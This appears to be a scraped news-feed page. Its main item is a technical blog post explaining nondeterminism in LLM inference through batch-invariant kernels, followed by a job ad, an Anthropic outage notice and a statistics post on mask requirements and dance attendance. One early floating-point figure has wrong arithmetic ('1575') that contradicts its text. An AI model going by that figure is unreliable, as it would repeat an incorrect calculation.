For example, for the value 3450, we can represent it exactly as $3.45 * 10^3$. We can also represent much smaller values like 0.486 as $4.86 * 10^{-1}$. In this way, floating point allows us to represent both very small as well as very large values. In the sciences, we might say that floating point allows us to maintain a constant number of “significant figures”.
If you add together two floating-point numbers with the same exponent, it looks similar to integer addition. For example, 123 ($1.23 * 10^2$) + 456 ($4.56 * 10^2$) results in 579 ($5.79 * 10^2$).
But what happens when we add two floating-point numbers with different exponents, such as 1230 and 23.4?  In this case, the exact result is 1253.4. However, we can only maintain 3 digits of precision at a time. Floating-point addition will thus drop the last 2 digits and obtain the value $1.25 * 10^3$ (or 1250).


        
            1.23 × 10²
        
        +
        
            3.45 × 10¹
        
        =
        
            1.575 × 10²
            Exact: 1575
        
    



We require 3 digits of precision to represent 1230 and 3 digits of precision to represent 23.4. However, adding these 2 numbers together results in a number that requires 5 digits of precision to represent (1253.4). Our floating-point format must then drop the 34 off the end. In some sense, we have effectively rounded our original 23.4 to 20.0 before adding it. 

At this point, however, we’ve destroyed information. Note that this can happen every time we add two floating-point numbers with different “scales” (i.e. different exponents). And adding together floating-point numbers with different exponents happens all of the time. In fact, if we could guarantee that we never needed different exponents, we could just use integers!
In other words, every time we add together floating-point numbers in a different order, we can get a completely different result. To take an extreme example, there are 102 possible different results for summing this array depending on the order.
import random

vals = [1e-10, 1e-5, 1e-2, 1]
vals = vals + [-v for v in vals]

results = []
random.seed(42)
for _ in range(10000):
    random.shuffle(vals)
    results.append(sum(vals))

results = sorted(set(results))
print(f"There are {len(results)} unique results: {results}")

# Output:
# There are 102 unique results: [-8.326672684688674e-17, -7.45931094670027e-17, ..., 8.326672684688674e-17]
Although this is the underlying cause for non-identical outputs, it does not directly answer where the nondeterminism comes from. It doesn’t help us understand why floating-point values get added in different orders, when that happens, nor how it can be avoided.
The answers lie in how kernels are implemented.
Why don’t kernels always add numbers in the same order?
As mentioned above, one common explanation for why kernels add numbers in different orders is the “concurrency + floating point” hypothesis. The hypothesis states that if the order in which concurrent threads finish is nondeterministic and the accumulation order depends on the order in which concurrent threads finish (such as with an atomic add), our accumulation order will be nondeterministic as well.
Confusingly, although this can lead to nondeterministic kernels, concurrency (and atomic adds) end up being completely uninvolved in LLM inference nondeterminism! To explain what the real culprit is, let’s first understand why modern GPU kernels rarely need atomic adds.
When are atomic adds needed?
Typically a GPU launches a program concurrently across many “cores” (i.e. SMs). As the cores have no inherent synchronization among them, this poses a challenge if the cores need to communicate among each other. For example, if all cores must accumulate to the same element, you can use an “atomic add” (sometimes known as a “fetch-and-add”). The atomic add is “nondeterministic” — the order in which the results accumulate is purely dependent on which core finishes first.
Concretely, imagine that you are reducing a 100-element vector with 100 cores (e.g. torch.sum()). Although you can load all 100 elements in parallel, we must eventually reduce down to a single element. One way to accomplish this is with some kind of “atomic add” primitive, where the hardware guarantees that all additions will be processed but does not guarantee the order.




 The atomic add ensures that every core's contributions will be reflected in the final sum. However, it makes no guarantee about what order the contributions will be added. The order depends entirely on which core finishes first, a nondeterministic property. Thus, executing the same parallel program multiple times can result in nondeterministic outputs. 

This is usually what folks mean by “nondeterminism” — you execute the same kernel twice with exactly the same inputs and you get a different result out. This is known as run-to-run nondeterminism, where you run the same python script twice with the exact same dependencies but get a different result.
Although concurrent atomic adds do make a kernel nondeterministic, atomic adds are not necessary for the vast majority of kernels. In fact, in the typical forward pass of an LLM, there is usually not a single atomic add present.
This may be surprising, given that parallelizing a reduction can benefit from atomic adds. There are two main reasons why atomic adds do not end up being needed.

There is often sufficient parallelism along the “batch” dimension that we don’t need to parallelize along the reduction dimension. For example, let’s say that instead of reducing a single 100-dim vector we were reducing 500 vectors in parallel. In this case, we can reduce an entire vector in each core and allow every core to operate on a different vector.
Over time, most neural network libraries have adopted a variety of strategies for achieving determinism without sacrificing performance. For example, we can perform a “split” (or tree) reduction, where we split the 100-element reduction into five 20-element reductions (thus achieving five-way parallelism). Then, to combine the remaining five elements, we can either perform a separate “clean-up” reduction (which isn’t parallelized, but operates over few enough elements to be cheap) or utilize a semaphore (which ensures that each concurrent thread-block will accumulate in a deterministic order).The semaphore strategy can be found described here.

Due to these two factors, avoiding atomics adds is a negligible performance penalty for the vast majority of neural network operations.
There are still a couple of common operations that have significant performance penalties for avoiding atomics. For example, scatter_add in PyTorch (a[b] += c). The only one commonly used in LLMs, however, is FlashAttention backward.Fun fact: did you know that the widely used Triton implementations of FlashAttention backward actually differ algorithmically from Tri Dao’s FlashAttention-2 paper? The standard Triton implementation does additional recomputation in the backward pass, avoiding atomics but costing 40% more FLOPs!
However, the forward pass of an LLM involves no operations that require atomic adds. Thus, the forward pass in an LLM is in fact “run-to-run deterministic.”











Model

Deterministic



User requests




Other user requests




Output




















































From the perspective of the inference server, it is deterministic. Given the exact same user requests, it will always provide the same deterministic output. 

Wikipedia writes that “a deterministic algorithm is an algorithm that, given a particular input, will always produce the same output.” And in this case, given the exact same inputs (i.e. the exact requests the inference server is processing), the forward pass always produces the exact same outputs.
However, the forward pass itself being “deterministic” is not sufficient to ensure that a system that includes it is deterministic. For example, what if our request’s output depended on the parallel user requests (e.g. batch-norm)? Since each individual request has no way of knowing what the parallel requests will be, from their perspective our overall LLM inference is also nondeterministic!
As it turns out, our request’s output does depend on the parallel user requests. Not because we’re somehow leaking information across batches — instead, it’s because our forward pass lacks “batch invariance”, causing our request’s output to depend on the batch size of our forward pass.
Batch Invariance and “Determinism”
To explain batch invariance, let’s simplify the system and look solely at matmuls. You can assume that all matmul implementations are “run-to-run deterministic."This is not totally true, but most common matmul implementations do have this property.  However, they are not “batch-invariant.” In other words, when the batch size changes, each element in the batch can get different results.
This is a fairly unusual property from a mathematical perspective. Matrix multiplication should be “independent” along every element in the batch — neither the other elements in the batch nor how large the batch is should affect the computation results of a specific element in the batch.
However, as we can observe empirically, this isn’t true.
import torch
torch.set_default_device('cuda') 

B = 2048
D = 4096
a = torch.linspace(-1000, 1000, B*D).reshape(B, D)
b = torch.linspace(-1000, 1000, D*D).reshape(D, D)
# Doing a matrix vector multiplication by taking
# the first element of the batch
out1 = torch.mm(a[:1], b)
# Doing a matrix matrix multiplication and then taking
# the first element of the batch
out2 = torch.mm(a, b)[:1]
print((out1 - out2).abs().max()) # tensor(1669.2500, device='cuda:0')
Note that this is “run-to-run deterministic.” If you run the script multiple times, it will deterministically return the same result.It is not “hardware/software version invariant” — your GPU/PyTorch version may return a different value, but it should deterministically return the same value.
However, when a non-batch-invariant kernel is used as part of a larger inference system, the system can become nondeterministic. When you make a query to an inference endpoint, the amount of load the server is under is effectively “nondeterministic” from the user’s perspective. The load determines the batch size that the kernels are run under, and thus changes the eventual result of each individual request!


















Model

Deterministic
Nondeterministic



User requests




Other user requests




Output


































































Although the inference server itself can be claimed to be "deterministic", the story is different for an individual user. From the perspective of an individual user, the other concurrent users are not an "input" to the system but rather a nondeterministic property of the system. This makes LLM inference "nondeterministic" from the perspective of each user.

If you compose some property under which the kernel is not invariant (i.e. batch-size) with nondeterminism of that property (i.e. the load the server is under), you get a nondeterministic system.
In other words, the primary reason nearly all LLM inference endpoints are nondeterministic is that the load (and thus batch-size) nondeterministically varies! This nondeterminism is not unique to GPUs — LLM inference endpoints served from CPUs or TPUs will also have this source of nondeterminism.
So, if we’d like to avoid nondeterminism in our inference servers, we must achieve batch invariance in our kernels. In order to understand how that can be achieved, let’s first take a look at why kernels don’t have batch invariance in the first place.
How do we make kernels batch-invariant?
In order to make a transformer implementation batch-invariant, we must make every kernel batch-invariant. Luckily, we can assume that every pointwise operation is batch-invariant.Although this is true for all kernels in say, PyTorch, it’s not inherently true. For example, there are some kernel implementations on CPU that will use vectorized intrinsics on some parts of the array and non-vectorized intrinsics on other parts, and these intrinsics don’t necessarily always have bitwise identical numerics. Thus, we only need to worry about the 3 operations that involve reductions — RMSNorm, matrix multiplication, and attention.Reductions related to parallelism are out of the scope of this discussion, but the same principles apply. One factoid that may be useful is that NVLink-Sharp in-switch reductions are deterministic on Blackwell as well as Hopper with CUDA 12.8+. As is the case with many things, this information can be found on NCCL’s github issues
Conveniently, these are also ordered in ascending levels of difficulty. Each one requires some additional considerations to achieve batch invariance with reasonable performance. Let’s talk about RMSNorm first.
Batch-Invariant RMSNorm











































Data Parallel RMSNorm Ideally, we'd like to avoid communication between cores in our parallelization strategy. One way to achieve that is by assigning one batch-element to each core, thus guaranteeing that each reduction is done entirely within a single core. This is what's known as a "data-parallel" strategy, since we're simply parallelizing along a dimension that doesn't require communication. In this example, we have four rows and four cores, saturating our cores. 

RMSNorm can be implemented as:
# x: [batch_size, hidden_dim]
# weight: [hidden_dim]
def rms_norm(x, weight):
    return x * torch.rsqrt(torch.mean(x ** 2, dim=-1, keepdim=True)) * weight
The requirement for batch invariance is that the reduction order for each element must be fixed regardless of the batch-size of the kernel. Note that this doesn’t mean we must always use the same reduction strategy. For example, if we change the number of elements we’re reducing over, we can still be batch-invariant even if our reduction strategy changes.The Quack blog post has some nice examples showing the hierarchy of various reduction strategies you can do (e.g. thread reduction, warp reduction, block reduction, cluster reduction).
Thus, we only break batch invariance when our batch-size affects the reduction strategy.
Let’s look at the standard parallelism strategy for RMSNorm. Generally, parallel algorithms benefit from minimizing communication across cores. For the purpose of this discussion you can assume that when we refer to “cores” we mean SMs. More specifically, the property here that’s important is that the # of threadblocks our kernel launches is greater than the # of SMs. So, one strategy we can start with is to assign each batch element to one core, as seen in the above figure.
Increasing our batch size doesn’t affect our reduction strategy; if a batch size of 200 provides sufficient parallelism to our kernel then a batch size of 2000 will definitely provide sufficient parallelism.



































































Data Parallel RMSNorm for larger batches Extending the data-parallel strategy to larger batches is fairly straightforward --- instead of having each core handle one row you allow each core to handle different rows sequentially. This preserves batch invariance as the reduction strategy for each batch element remains identical. 

On the other hand, decreasing the batch size can pose challenges. Because we assign each batch element to one core, decreasing our batch size will eventually lead to having more cores than batch elements, leaving some cores idle.
Upon encountering this situation, a good kernel engineer would reach for one of the solutions mentioned in the prior section (atomic adds or split reductions), maintaining good parallelism and thus, good performance. Unfortunately, this changes the reduction strategy, preventing this kernel from being batch-invariant.































Split-Reduction RMSNorm If we have a small batch size, our data-parallel strategy may no longer have sufficient parallelism to saturate our cores. In this case, it may be more efficient to "split" a reduction among multiple cores, allowing us to fully utilize our GPU. However, this loses batch invariance, as we are no longer reducing each element in the same order.

The easiest solution is to simply ignore these cases altogether. This is not completely unreasonable — a small batch size means that the kernel is likely to execute quickly anyways, and so a slowdown may not be catastrophic.
If we were compelled to optimize this use case, one approach would be to consistently use a reduction strategy that has enough parallelism even for very small batch sizes. Such a reduction strategy would lead to an excess amount of parallelism for larger batch sizes but would allow us to achieve decent (but not peak) performance across the entire range of sizes.
Batch-Invariant Matrix Multiplication














































































Data Parallel Matmul Similar to RMSNorm, the standard parallelism strategy for matmuls is a "data-parallel" strategy, keeping the entire reduction in one core. It is most straightforward to think about splitting the output tensor into 2D tiles and assigning each tile to a different core. Each core then computes the dot products that belong to that tile, once again performing the entire reduction within one core.
Unlike for RMSNorm, additional constraints around arithmetic intensity and utilizing tensorcores force us to split 2D tiles instead of individual output elements for efficient matmul kernels.


At its core, you can view matrix multiplication as simply a pointwise operation followed by a reduction. Then, if we parallelize our matrix multiplication by chunking the output into tiles, we have an analogous “data-parallel” kernel strategy that keeps each reduction within one core.
Also similar to RMSNorm, it is possible for our “batch” dimensions (M and N) to become too small, forcing us to split along the reduction dimension (K). Despite having two “batch” dimensions, matmuls also require us to have much more “work” per core in order to leverage tensorcores effectively. For example, if you have a [1024, K] x [K, 1024] matmul and a standard 2D tile size of [128, 128], a data-parallel strategy would only be able to split this matmul into 64 cores, insufficient to saturate the GPU.
Splitting along the reduction dimension in a matmul is known as a Split-K Matmul. And just like RMSNorm, using this strategy breaks batch invariance.

Another interesting parallelism strategy for matmuls is stream-k. Stream-k is interesting because it has even less invariance than typical matmuls. As discussed, most matmul libraries are not batch-invariant, but they’re at least what you could call batch-position-invariant (i.e. changing the position of the element within the batch does not affect numerics). However, stream-k is not batch-position-invariant either! Its core insight is that you can get cleaner load-balancing by splitting along k in different ways for different output tiles, but taking advantage of this makes our kernel not batch-position-invariant either. 






















































Split-K Matmul If our batch dimension is fairly small we may not have enough parallelism and require a split-k matmul. In this example, we split each reduction across two cores, which would accumulate separately and then combine their results at the end. However, splitting each reduction across two cores allows us to still leverage eight cores.



There’s an additional complexity with matmuls — tensor core instructions. Whereas with reductions we could simply operate on one row at a time, efficient matrix multiplication kernels must operate on an entire “tile” at a time.
Each tensor-core instruction (like say, wgmma.mma_async.sync.aligned.m64n128k16) may have a different reduction order internally. One reason to use a different tensor-core instruction might be that the batch size is very small. For example, if we use a tensor-core PTX instruction that operates on a tile of length 256 but the batch size is only 32, we’re wasting almost all of that compute! At a batch-size of 1, the fastest kernels usually don’t use tensor cores at all.







































































Padded Tensor-Core Instructions If the batch size is too small, we may be in our situation where we can't fit even one of our 2D tiles in the output. In this case, it is most efficient to switch to a smaller tensor-core instruction or eschew tensor-cores altogether! However, both of these options prevent our kernel from being batch-invariant.

So, the easiest way to ensure batch invariance for matmuls is to compile one kernel configuration and use that for all shapes. Although we will lose some performance, this isn’t typically disastrous in LLM inference. In particular, split-k is most needed when both M and N are small, and luckily in our case, N (i.e. the model dim) is usually pretty large!

  Despite obtaining batch invariance, we only lose about 20% performance compared to cuBLAS. Note that this is not an optimized Triton kernel either (e.g. no TMA). However, some of the patterns in performance are illustrative of where our batch-invariant requirement loses performance. First, note that we lose a significant amount of performance at very small batch sizes due to an overly large instruction and insufficient parallelism. Second, there is a "jigsaw" pattern as we increase the batch-size that is caused by quantization effects (both tile and wave) that are typically ameliorated through changing tile sizes. You can find more on these quantization effects here.
  
  

Batch-Invariant Attention





















































FlashAttention2 Strategy We parallelize along Q, and reduce along K/V simultaneously. This means that our entire reduction can be kept within a single core, making it another data-parallel strategy.

After obtaining batch invariance for matmuls, attention introduces two additional wrinkles — fittingly,  because it contains two matmuls.

As opposed to only reducing over the feature dimension like both RMSNorm and matmuls, we now reduce over the feature dimension and sequence dimension.
Due to the above, attention must deal with a variety of inference optimizations that affect how sequences get processed (chunked prefill, prefix caching, etc.).

Thus, to achieve determinism in LLM inference our numerics must be invariant to both how many requests are processed at once and how each request gets sliced up in the inference engine.
Let’s first walk through the standard parallelism strategy for attention, first introduced in FlashAttention2. Similar to RMSNorm and Matmul, the default strategy is a “data-parallel” strategy. Since we reduce along the key/value tensors, a data-parallel strategy can only parallelize along the query tensor.
For example, depending on the inference engine’s choices, it’s possible that a sequence might get processed in several parts (such as in chunked prefill) or perhaps all at once (if the prefill isn’t split up). In order to achieve “batch invariance”, it’s necessary that the reduction order for a given token does not depend on how many other tokens from its sequence are being simultaneously processed. If you reduce over the K/V values in the KV cache separately from the K/V values in the current tokens being processed (like in vLLM’s Triton attention kernel), this can’t be achieved. For example, when processing the 1000th query token in a sequence, the reduction order must be identical regardless of whether 0 tokens are in the KV cache (prefill) or 999 tokens are in the KV cache (decoding).






























































FlashAttention with a KV Cache The reason why explicitly handling the KV cache separately from the current KV values breaks batch invariance is a bit subtle and is related to "boundary conditions". In particular, imagine your block size is 32 but we currently have 80 elements in our KV cache. We then compute an additional 48 elements that aren't cached. In this case, we need three blocks (two full and one masked) to compute "P cache" and another two blocks (one full and one masked) to compute "P". This is therefore five total blocks to compute our reduction when we only have four total blocks (i.e. 128) of elements to compute, which will definitely change our reduction order. 
For example, if we instead had no elements in our KV Cache and were processing 128 elements altogether, we need to have identical numerics in both of these situations to ensure “batch invariance” for attention.
 

To resolve this, we can just update the KV cache and page table before the attention kernel itself, ensuring that our keys and values are always consistently laid out regardless of how many tokens are being processed.
With this additional detail (as well as all the things mentioned in the previous section, like consistent tile sizes), we are able to achieve a batch-invariant attention implementation!
However, there is a significant problem here. Unlike with matrix multiplication, the attention shapes we see in LLM inference often do require a split-reduction kernel, often known as Split-KV or FlashDecoding. This is because if we don’t parallelize along the reduction, we can only parallelize along the batch dimension, head dimension, and “query length” dimension. In the decode stage of attention, query length is very small, and so unless we have a very large batch size we are often unable to saturate the GPU.
Unfortunately, it’s not as easy to ignore this case as it was for RMSNorm and Matmuls. For example, if you have a very long KV cache, the attention kernel may take a very long time despite only processing one request.



































Fixed # Split-KV Strategy (i.e. FlashDecode) If our query length becomes very small (like it does during decoding), we may end up in a situation where there is very little parallelism in our kernel at all. In these cases, we'll need to once again split along the reduction dimension --- the KV dimension this time. The typical strategy for how to split along the KV dimension is to figure out how much parallelism we need and then divide the KV dimension evenly. For example, if our KV length was 1000 and we needed 4 splits, each core would handle 250 elements.
This unfortunately also breaks batch invariance, as our precise reduction strategy depends on how many query tokens from the sequence we’re processing in any given request.


Furthermore, the split-reduction strategies commonly used for attention also pose challenges for batch invariance. For example, FlashInfer’s “balanced scheduling algorithm” chooses the largest split-size that can still saturate all the GPU’s cores, thus making the reduction strategy not “batch-invariant”. However, unlike with RMSNorm/Matmuls, it’s not sufficient to choose a fixed number of splits regardless of the batch size.
Instead, to achieve batch invariance, we must adopt a “fixed split-size” strategy. In other words, instead of fixing the # of splits, we fix the size of each split and then end up with a varying number of splits. In this manner, we can guarantee that regardless of how many tokens we’re processing, we always perform the identical reduction order. This requires some internal FlexAttention changes that are not included in our code release. We will upstream them in the near future!




































Fixed Size Split-KV Strategy 
The only difference between this strategy and the previous strategy is that our splits are now "fixed size". For example, if our KV length was 1000, instead of splitting it into four even length 250 splits, we would split it into three fixed-size length 256 splits and one length 232 split.
This allows us to preserve batch invariance as our reduction strategy is no longer dependent on how many query tokens we’re processing at once!
 

Implementation
We provide a demonstration of deterministic inference on top of vLLM by leveraging its FlexAttention backend as well as torch.Library.
Through torch.Library, we’re able to substitute out most of the relevant PyTorch operators in an unintrusive way. You can find the library of “batch-invariant” kernels at thinking-machines-lab/batch-invariant-ops, as well as the vLLM example of running in “deterministic” mode.
Experiments
How nondeterministic are completions?
We use Qwen/Qwen3-235B-A22B-Instruct-2507 and sample 1000 completions at temperature 0 with the prompt “Tell me about Richard Feynman” (non-thinking mode), generating 1000 tokens each. Surprisingly, we generate 80 unique completions, with the most common of these occuring 78 times.
Looking at where the completions differ, we see that the completions are actually identical for the first 102 tokens! The first instance of diverging completions occurs at the 103rd token. All completions generate the sequence “Feynman was born on May 11, 1918, in” However, 992 of the completions go on to generate “Queens, New York” whereas 8 of the completions generate “New York City”.

On the other hand, when we enable our batch-invariant kernels, all of our 1000 completions are identical. This is what we would mathematically expect from our sampler, but we aren’t able to achieve deterministic results without our batch-invariant kernels.

Performance
We have not put a significant effort into optimizing the performance of the batch-invariant kernels here. However, let’s run some experiments to verify that our performance remains usable.
We will set up an API server with one GPU running Qwen-3-8B, and request 1000 sequences with an output length of between 90 and 110.

  
      
          Configuration
          Time (seconds)
      
  
  
      
          vLLM default
          26
      
      
          Unoptimized Deterministic vLLM
          55
      
      
          + Improved Attention Kernel
          42
      
  

Much of the slowdown comes from the fact that the FlexAttention integration in vLLM has not been heavily optimized yet. Nevertheless, we see that performance is not disastrous.
True on-policy RL
As researchers have noted, the different numerics between training and inference implicitly turns our on-policy RL into off-policy RL.
Of course, it is impossible to get bitwise identical results between training and inference if we can’t even get bitwise identical results from two identical inference requests. Then, deterministic inference enables us to also modify our training stack to obtain bitwise identical results between sampling and training, thus resulting in true on-policy RL.
We run experiments in a RLVR setup on Bigmath with the RL policy initialized from the Qwen 2.5-VL instruct 8B with a max rollout length of 4096.
If we train without off-policy correction (i.e. importance weighting), our reward collapses partway through training, whereas adding an off-policy correction term  allows training to proceed smoothly. But, if we achieve bitwise identical results between our sampler and trainer, we are fully on policy (i.e. 0 KL divergence) and can also train smoothly.
We can also plot the KL-divergence in logprobs between our sampler and trainer, where all 3 runs have notably different behavior. When running with importance weighting, it stays around 0.001 with occasional spikes. However, running without importance weighting eventually leads to a spike in KL-divergence around the same time that reward crashes. And, of course, when running “True On-Policy RL”, our KL-divergence stays flat at 0, indicating that there is no divergence between the training policy and sampling policy.



  Note that the run without importance weighting has a significant loss spike around Step 318, and this comes with a correspond ing spike in KL-divergence of logprobs. Meanwhile, either using an off-policy correction or running with "True On-Policy" allows RL to continue smoothly. The blue line showing "True On-Policy" is not a bug - it's just a flat line at 0. 
  
  

Conclusion
Modern software systems contain many layers of abstractions. In machine learning, when we run into nondeterminism and subtle numerical differences it can often be tempting to paper over them. After all, our systems are already “probabilistic”, so what’s wrong with a little more nondeterminism? What’s wrong with bumping up the atol/rtol on the failing unit test? The difference in logprobs between the trainer and the sampler probably isn’t a real bug, right?
We reject this defeatism. With a little bit of work, we can understand the root causes of our nondeterminism and even solve them! We hope that this blog post provides the community with a solid understanding of how to resolve nondeterminism in our inference systems and inspires others to obtain a full understanding of their systems.
Citation
Please cite this work as:
He, Horace and Thinking Machines Lab, "Defeating Nondeterminism in LLM Inference", 
Thinking Machines Lab: Connectionism, Sep 2025.
Or use the BibTeX citation:
@article{he2025nondeterminism,
  author = {Horace He and Thinking Machines Lab},
  title = {Defeating Nondeterminism in LLM Inference},
  journal = {Thinking Machines Lab: Connectionism},
  year = {2025},
  note = {https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/},
  doi = {10.64434/tml.20250910}
}

    
  ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Bild AI (YC W25) Is Hiring]]></title>
            <link>https://www.ycombinator.com/companies/bild-ai/jobs/m2ilR5L-founding-engineer-applied-ai</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45200593</guid>
            <description><![CDATA[Puneet and I (Roop) founded Bild AI to tackle the mess that is blueprint reading, cost estimation, and permit applications in construction. It's a tough technical problem that requires the newest CV and AI approaches, and we’re impact-driven to make it more efficient to build more houses, hospitals, and schools. Featured on Business Insider (https://www.businessinsider.com/ai-startup-bild-3-million-seed-affordable-housing-2025-6).
You’ll
Focus on the intelligence-layer instead of the application-layer
Apply the newest computer vision, LLM models, and AI systems
Ship initial prototypes quickly, and improve them based on user feedback
We want
Applied CV/ML experience
0-to-1 builder, with your AI in production
Growth mindset, slope > y-intercept
Communicate with empathy and honesty. Tell us what makes you happy/unhappy
Don’t mind schlep (https://www.paulgraham.com/schlep.html). We are regularly knee-deep in schlep
Bonus points (if any)
Have built something people used/paid for (founder/startup)
Have a construction background
Are impact-driven
Message with
Why we’re a fit
Your favorite fruit (mine is Sitaphal (https://en.wikipedia.org/wiki/Custard_apple))
(Please keep it short)
Logistics
SF-based or willing to relocate, fulltime in-office]]></description>
            <content:encoded><![CDATA[AI that understands construction blueprintsFounding Engineer (Applied AI)$100K - $180K•0.50% - 2.00%•San Francisco, CA, USJob typeFull-timeRoleEngineering, Machine learningExperienceAny (new grads ok)VisaUS citizen/visa onlySkillsPython, Machine Learning, Deep Learning, Computer VisionConnect directly with founders of the best YC-funded startups.Apply to role ›About the rolePuneet and I (Roop) founded Bild AI to tackle the mess that is blueprint reading, cost estimation, and permit applications in construction. It's a tough technical problem that requires the newest CV and AI approaches, and we’re impact-driven to make it more efficient to build more houses, hospitals, and schools. Featured on Business Insider.
You’ll

Focus on the intelligence-layer instead of the application-layer
Apply the newest computer vision, LLM models, and AI systems
Ship initial prototypes quickly, and improve them based on user feedback

We want

Applied CV/ML experience
0-to-1 builder, with your AI in production
Growth mindset, slope > y-intercept
Communicate with empathy and honesty. Tell us what makes you happy/unhappy
Don’t mind schlep. We are regularly knee-deep in schlep

Bonus points (if any)

Have built something people used/paid for (founder/startup)
Have a construction background
Are impact-driven

Message with

Why we’re a fit
Your favorite fruit (mine is Sitaphal)
(Please keep it short)

Logistics

SF-based or willing to relocate, fulltime in-office

About Bild AIBild AI is an early-stage startup with a ton of really difficult technical challenges to solve. We're building blueprint understanding with a model-garden approach, so there is a lots of ground to break. We raised from the top VCs in the world before demo day and have a customer-obsessed approach to product development.Founded:2024Batch:W25Team Size:3Status:ActiveFoundersSimilar Jobs]]></content:encoded>
        </item>
        <item>
            <title><![CDATA['Block Everything' protests sweep across France, scores arrested]]></title>
            <link>https://www.reuters.com/world/europe/block-everything-protests-sweep-across-france-scores-arrested-2025-09-10/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45200357</guid>
        </item>
        <item>
            <title><![CDATA[Anthropic Services Down]]></title>
            <link>https://status.anthropic.com/incidents/k6gkm2b8cjk9</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45200118</guid>
            <description><![CDATA[Anthropic's Status Page - API, Claude.ai, and Console services impacted.]]></description>
            <content:encoded><![CDATA[
      

      
        
          
            Resolved
          
          
            This incident has been resolved.
            
            
              Posted Sep 10, 2025 - 17:36 UTC
            
          
        
        
          
            Update
          
          
            We are continuing to monitor services.
            
            
              Posted Sep 10, 2025 - 17:30 UTC
            
          
        
        
          
            Monitoring
          
          
            A fix has been implemented and we are monitoring the results.
            
            
              Posted Sep 10, 2025 - 17:15 UTC
            
          
        
        
          
            Update
          
          
            A fix has been implemented and we are monitoring the results.
            
            
              Posted Sep 10, 2025 - 16:55 UTC
            
          
        
        
          
            Update
          
          
            A fix has been implemented and we are monitoring the results.
            
            
              Posted Sep 10, 2025 - 16:37 UTC
            
          
        
        
          
            Identified
          
          
            APIs, Console, and Claude.ai are down. Services will be restored as soon as possible.
            
            
              Posted Sep 10, 2025 - 16:28 UTC
            
          
        

      
        
          This incident affected: claude.ai, console.anthropic.com, and api.anthropic.com.
        
    ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Wiggling into Correlation]]></title>
            <link>https://entropicthoughts.com/wiggling-into-correlation</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45199976</guid>
            <description><![CDATA[Jeff Kaufman shared some data around contra dance attendance as a function of
requirements on wearing surgical masks. He compares this data to survey data,
which is a useful way to validate in both directions.]]></description>
            <content:encoded><![CDATA[
                
Jeff Kaufman shared some data around contra dance attendance as a function of
requirements on wearing surgical masks. He compares this data to survey data,
which is a useful way to validate in both directions.



I found the plot compelling for a different reason – depending on how we look at
it, we can draw wildly different conclusions from it. On the one hand, if we
draw boxes around consecutive pairs of dances, it’s fairly obvious that
mask-optional dances are more popular. Tickmarks at the top indicate pairs that
support the hypothesis.11 Some dances had to be excluded from pairs because
there are not equal numbers of both kinds. I decided to mechanically pick “the
next pair” whenever there were runs of the same type of dance, which means no
bias was introduced by cleverly selecting pairs, even if that particular
mechanic may result in more extreme results than some other mechanic.







It doesn’t require much statistical literacy to recognise that 18/20 successes
is statistically significant.22 For completeness, the Agresti–Coull (“add two
successes and two failures”) confidence interval is 68.1–98.5 %, well clear of
the null hypothesis of 50 %. I would entertain arguments that this is a
sensible procedure, because it’s likely dances close in time share other common
factors that affect popularity, so this could be said to give an
apples-for-apples comparison.



But we don’t know these pairs are of the all-else-equal kind. They rarely
aren’t when the experiment is not intentionally designed to be paired. For
example, maybe the first dance of a pair tends to steal participants from the
second? We could test this by lagging the pairs by one, such that pairs tend to
have the mask-required dance first.







These pairs aren’t as neat, but when we do this, we discover that only 13 out of
the 19 new pairs support the hypothesis. That’s much less obviously
meaningful.33 By way of confirmation, the Agresti–Coull interval now
comfortably straddles the null hypothesis, at 40.6–89.8 %.





Given the lack of pairing in the design, we’ll go back to basics, and compare
sources of variation. The number of attendees at the dances wiggles up and
down for a multitude of reasons. These reasons (and many more) are called
sources of variation in the attendance.



Maybe some dances are far away from where everyone lives;
maybe some dances coincide with national holidays;
maybe some dances are hosted by someone really popular;
maybe some dances are not marketed well at all;
maybe some dances offer free food;
but crucially for our analysis maybe some dances disincentivise attendance by
requiring surgical masks.



What we want want to figure out here is “how much of the variation in attendance
is due to the mask requirement compared to all other sources?”



First we need to figure out how much variation in attendance is there in the
first place. This we will call the total variation, and to get it we will censor
each data point such that we don’t know whether it belongs to a mask-required or
mask-optional dance.







In order to estimate the variation on the go, there’s that spc hack to
get the total standard deviation of the data. We start by imagining vertical bars
between consecutive points in the plot. The height of these bars make up a kind
of measure of the internal variation in the data. We estimate the height of
these bars by reference to the gridlines, and compute their mean height.







To be clear, we never actually print out the plot and draw bars on it, nor do we
ever write down the individual heights of the bars. We simply scan through the
plot, eyeball the vertical distance between consecutive points, and continuously
sum the distances up. Then we divide by the number of points minus one. On my
way to work, I got 41 as the average vertical distance between points. Your
number is likely to be different, as this is not an exact procedure.



As detailed in the article on this hack, this process overestimates the standard
deviation by 12.8 %, so we’ll scale back and arrive at 36 as the standard
deviation. We square this to get the total variance: 1,320.



Then we perform the same operation on just the mask-required dances.







We estimate the average height of the bars to be 34. What’s neat about this
level of variation is that it’s independent of the effects of mask requirements,
since the mask requirements are the same for all dances here. In other words,
this variation must be due to sources other than masking. We’ll do the same
thing for the mask-optional dances.







The averge height here is maybe 45. We are going to assume that the same sources
of variation affect both mask-required and mask-optional dances, so we’ll take
the average of these averages:



\[\frac{19 \times 34 + 23 \times 45}{19 + 23} \approx 40\]



We land at a grand average across both groups of 40. Corrected and squared, this
is a variance of 1,260.



As a reminder: the variance we got out of the groups independently, 1,260, must
be due to sources other than masking requirements, since the masking
requirements are the same for all dances within those groups. This is to be
contrasted with the total variation, 1,320, which includes the additional
variation source of masking requirements.



Since we have measured variation using the variance, our measurements are
additive: the total variance is the sum of all sources of variance. Thus, we can
fill out the equation:


total_variance = other_sources + masking_requirements
    1320       =      1260     +        ?



and it’s clear we’re looking at


total_variance = other_sources + masking_requirements
    1320       =      1260     +       60



In other words, other sources account for most of the variation in dance
attendance, and masking only plays a small part. The amount of the total
variation contributed by masking requirements is 5 %. This number is called the
coefficient of determination, and its square root is the correlation: 0.21.
This correlation is low enough that we cannot conclude that masking has a
significant effect on attendance.44 For details on this, see the surprising
richness of correlations.



But look at that! We measured the total variation, and then we measured the
variation within the groups to figure out how much variation is caused by
sources other than masking, and this let us paint an intuitive picture of how
